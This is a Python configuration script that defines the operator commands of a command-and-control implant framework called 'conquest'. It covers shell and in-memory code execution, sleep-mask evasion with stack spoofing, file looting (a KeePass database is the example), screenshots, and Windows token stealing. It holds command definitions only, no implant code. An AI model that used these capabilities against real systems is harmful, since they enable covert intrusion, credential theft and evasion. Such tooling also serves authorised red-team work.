import conquest

# Built-in modules (always enabled)
cmd_exit = (
    conquest.createCommand(name="exit", description="Exit the agent.", example="exit process")
            .addArgString("type", "Available options: PROCESS/THREAD.", False, "PROCESS"))
cmd_selfdestruct = conquest.createCommand(name="self-destruct", description="Exit the agent and delete the executable from disk.", example="self-destruct")
conquest.registerModule(name="exit", description="Terminate the agent process or thread.", commands=[cmd_exit, cmd_selfdestruct], builtin=True)

cmd_sleep = (
    conquest.createCommand(name="sleep", description="Update sleep delay settings.", example="sleep 5 15")
            .addArgInt("delay", "Delay in seconds.", True)
            .addArgInt("jitter", "Jitter in % (0-100)"))
cmd_sleepmask = (
    conquest.createCommand(name="sleepmask", description="Update sleepmask settings.", example="sleepmask ekko --spoof")
            .addArgString("technique", "Sleep obfuscation technique (NONE, EKKO, ZILEAN, FOLIAGE). Executing without arguments retrieves current sleepmask settings.")
            .addFlagBool("--spoof", "spoof", "Use stack spoofing to obfuscate the call stack"))
conquest.registerModule(name="sleep", description="Change sleep configuration", commands=[cmd_sleep, cmd_sleepmask], builtin=True)

cmd_link = (
    conquest.createCommand(name="link", description="Create a link to a SMB agent.", example="link DC01 msagent_1234")
            .addArgString("host", "Host on which the SMB agent is running.", True)
            .addArgString("pipe", "Name of the named pipe (SMB listener).", True))
cmd_unlink = (
    conquest.createCommand(name="unlink", description="Remove a link to a SMB agent.", example="unlink C804A284")
            .addArgString("agent", "ID of the agent to unlink.", True))
conquest.registerModule(name="link", description="Manage linked agents.", commands=[cmd_link, cmd_unlink], builtin=True)   

# Execution modules
cmd_shell = (
    conquest.createCommand(name="shell", description="Execute a shell command and retrieve the output.", example="shell whoami /all")
            .addArgString("command", "Command to be executed.", True)
            .addArgString("arguments", "Arguments to be passed to the command."))
conquest.registerModule(name="shell", description="Execute shell commands.", commands=[cmd_shell])

cmd_bof = (
    conquest.createCommand(name="bof", description="Execute an object file in memory and retrieve the output.", example="bof /path/to/dir.x64.o C:\\Users")
            .addArgFile("object-file", "Path to the object file to execute.", True)
            .addArgString("arguments", "Arguments to be passed to the object file."))
conquest.registerModule(name="bof", description="Load and execute BOF/COFF files in memory.", commands=[cmd_bof])

cmd_dotnet = (
    conquest.createCommand(name="dotnet", description="Execute a .NET assembly in memory and retrieve the output.", example="dotnet /path/to/Seatbelt.exe antivirus")
        .addArgFile("assembly", "Path to the .NET assembly to execute.", True)
        .addArgString("arguments", "Arguments to be passed to the assembly. Arguments are handled as STRING."))
conquest.registerModule(name="dotnet", description="Load and execute .NET assemblies in memory.", commands=[cmd_dotnet])

# Looting 
cmd_download = (
    conquest.createCommand(name="download", description="Download a file.", example="download C:\\Users\\john\\Documents\\Database.kdbx")
            .addArgString("file", "Path to file to download from the target machine.", True))
cmd_upload = (
    conquest.createCommand(name="upload", description="Upload a file.", example="upload /path/to/payload.exe")
            .addArgFile("file", "Path to file to upload to the target machine.", True)
            .addArgString("destination", "Path to upload the file to. By default, uploads to current directory."))
conquest.registerModule(name="filetransfer", description="Upload/download files to/from the target system.", commands=[cmd_download, cmd_upload])

cmd_screenshot = conquest.createCommand(name="screenshot", description="Take and retrieve a screenshot of the target desktop.", example="screenshot")
conquest.registerModule(name="screenshot", description="Take and retrieve a screenshot of the target desktop.", commands=[cmd_screenshot])

# Situational awareness
cmd_pwd = conquest.createCommand(name="pwd", description="Retrieve current working directory.", example="pwd")
cmd_cd = (
    conquest.createCommand(name="cd", description="Change current working directory.", example="cd C:\\Windows\\Tasks")
            .addArgString("directory", "Relative or absolute path of the directory to change to.", True))
cmd_ls = (
    conquest.createCommand(name="ls", description="List files and directories.", example="ls C:\\Users\\Administrator\\Desktop")
            .addArgString("directory", "Relative or absolute path. Default: current working directory."))
cmd_rm = (
    conquest.createCommand(name="rm", description="Remove a file.", example="rm C:\\Windows\\Tasks\\payload.exe")
            .addArgString("file", "Relative or absolute path to the file to delete.", True))
cmd_rmdir = (
    conquest.createCommand(name="rmdir", description="Remove a directory.", example="rmdir C:\\Payloads")
            .addArgString("directory", "Relative or absolute path to the directory to delete.", True))
cmd_move = (
    conquest.createCommand(name="move", description="Move a file or directory.", example="move source.exe C:\\Windows\\Tasks\\destination.exe")
            .addArgString("source", "Source file path.", True)
            .addArgString("destination", "Destination file path.", True))
cmd_copy = (
    conquest.createCommand(name="copy", description="Copy a file or directory.", example="copy source.exe C:\\Windows\\Tasks\\destination.exe")
            .addArgString("source", "Source file path.", True)
            .addArgString("destination", "Destination file path.", True))
conquest.registerModule(name="filesystem", description="Conduct simple filesystem operations via Windows API.", commands=[cmd_pwd, cmd_cd, cmd_ls, cmd_rm, cmd_rmdir, cmd_move, cmd_copy])

cmd_ps = conquest.createCommand(name="ps", description="Display running processes.", example="ps")
cmd_env = conquest.createCommand(name="env", description="Display environment variables.", example="env")
conquest.registerModule(name="systeminfo", description="Retrieve information about the target system and environment.", commands=[cmd_ps, cmd_env])

# Token manipulation
cmd_maketoken = (
    conquest.createCommand(name="make-token", description="Create an access token from username and password.", example="make-token LAB\\john Password123!")
            .addArgString("domain\\username", "Account domain and username. For impersonating local users, use .\\username.", True)
            .addArgString("password", "Account password.", True)
            .addArgInt("logonType", "Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).", False, 9))
cmd_stealtoken = (
    conquest.createCommand(name="steal-token", description="Steal the primary access token of a remote process.", example="steal-token 1234")
            .addArgInt("pid", "Process ID of the target process.", True))
cmd_rev2self = conquest.createCommand(name="rev2self", description="Revert to original access token.", example="rev2self")
cmd_tokeninfo = conquest.createCommand(name="token-info", description="Retrieve information about the current access token.", example="token-info")
cmd_enablepriv = (
    conquest.createCommand(name="enable-privilege", description="Enable a token privilege.", example="enable-privilege SeImpersonatePrivilege")
            .addArgString("privilege", "Privilege to enable.", True))
cmd_disablepriv = (
    conquest.createCommand(name="disable-privilege", description="Disable a token privilege.", example="disable-privilege SeImpersonatePrivilege")
            .addArgString("privilege", "Privilege to disable.", True))
conquest.registerModule(name="token", description="Manipulate Windows access tokens.", commands=[cmd_maketoken, cmd_stealtoken, cmd_rev2self, cmd_tokeninfo, cmd_enablepriv, cmd_disablepriv])